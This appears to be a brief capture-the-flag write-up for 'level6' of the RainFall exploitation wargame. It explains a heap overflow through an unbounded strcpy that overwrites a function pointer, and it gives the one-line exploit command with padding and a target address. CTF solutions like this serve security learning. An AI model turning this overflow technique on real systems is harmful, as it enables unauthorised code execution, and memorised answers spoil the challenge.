# level6

Heap-buffer overflow. strcpy with user argument with no bound checking. Function pointer allocated on the heap.

```
level6@RainFall:~$ ./level6 $(python -c 'print("a"*72 + "\x54\x84\x04\x08")')
```